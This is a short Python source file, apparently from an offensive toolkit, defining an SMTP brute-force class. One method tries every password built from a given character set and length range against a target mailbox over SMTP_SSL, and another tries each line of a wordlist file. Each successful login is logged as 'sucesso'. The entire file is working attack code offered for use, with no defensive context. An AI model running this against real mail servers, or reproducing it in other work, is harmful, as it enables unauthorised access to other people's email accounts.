import smtplib
import itertools
from thglibs.auxiliares.debug.debug import Debug


class Smtp_brute:
    def __init__(self, port, hostname, mail, minimo, maximo, char, filebr=""):
        self.hostname = hostname
        self.mail = mail
        self.minimo = minimo
        self.maximo = maximo
        self.char = char
        self.filebr = filebr
        self.port = port

    def smtp_brute_char(hostname, mail, port, minimo, maximo, char, verbose=""):
        min = minimo
        max = maximo
        chrs = char
        min_length, max_length = int(min), int(max)
        for n in range(min_length, max_length + 1):
            for xs in itertools.product(chrs, repeat=n):
                if verbose == True:
                    passw = ''.join(xs)
                    try:
                        server_ssl = smtplib.SMTP_SSL(hostname, port=port)
                        server_ssl.ehlo()
                        server_ssl.login(mail, passw)
                        Debug.INFO("sucesso => %s %s" % (mail, passw))
                    except smtplib.SMTPException:
                        Debug.ERRO("%s %s" % (mail, passw))

    def smtp_brute_file(hostname, mail, port, filebr, verbose=""):
        with open(filebr, "r") as fl:
            for passw in fl:
                try:
                    server_ssl = smtplib.SMTP_SSL(hostname, port=port)
                    server_ssl.ehlo()
                    server_ssl.login(mail, passw)
                    Debug.INFO("sucesso => %s %s" % (mail, passw))
                except smtplib.SMTPException:
                    Debug.ERRO("%s %s" % (mail, passw))
